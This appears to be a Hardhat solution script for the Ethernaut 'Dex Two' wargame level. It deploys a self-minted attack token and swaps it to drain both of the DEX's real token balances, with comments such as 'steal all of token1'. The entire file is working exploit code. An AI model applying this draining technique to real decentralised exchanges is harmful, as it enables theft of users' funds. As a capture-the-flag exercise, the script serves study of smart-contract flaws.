const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const Deployer = require("./deployer");


Runner.run(async () => { 
    
    //PLACE THE DEX TWO CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
    const dexAddr = "0x6BF274A71282403a6F6962651c318Ca764cEf8eb"; 
    
    const dex = await ethers.getContractAt("Dex", dexAddr); 
    
    //deploy attack token 
    const atkToken = await Deployer.deploy();
    
    //get token1 & token2 
    const token1 = await ethers.getContractAt("SwappableTokenTwo", await dex.token1()); 
    const token2 = await ethers.getContractAt("SwappableTokenTwo", await dex.token2()); 
    
    //get initial token amounts at dex
    const token1Balance = await token1.balanceOf(dex.address); 
    const token2Balance = await token2.balanceOf(dex.address); 
    
    console.log();
    console.log("* * * ");
    console.log(`token 1 balance is ${token1Balance}`);
    console.log(`token 2 balance is ${token2Balance}`);
    
    //steal all of token1
    console.log("token1....");
    await stealBalance(dex, atkToken, token1);
    
    //steal all of token2
    console.log("token2....");
    await stealBalance(dex, atkToken, token2);
    
    //show result 
    console.log();
    console.log(`token 1 balance is ${await token1.balanceOf(dex.address)}`);
    console.log(`token 2 balance is ${await token2.balanceOf(dex.address)}`);
    console.log("* * * ");
});

/**
 * 
 * @param {*} dex 
 * @param {*} attackToken 
 * @param {*} targetToken 
 */
async function stealBalance(dex, attackToken, targetToken) {
    const amount = await targetToken.balanceOf(dex.address);
    await attackToken.setBalance(amount); 
    await dex.swap(attackToken.address, targetToken.address, amount); 
    console.log(`token balance remaining in dex is ${await targetToken.balanceOf(dex.address)}`);
}
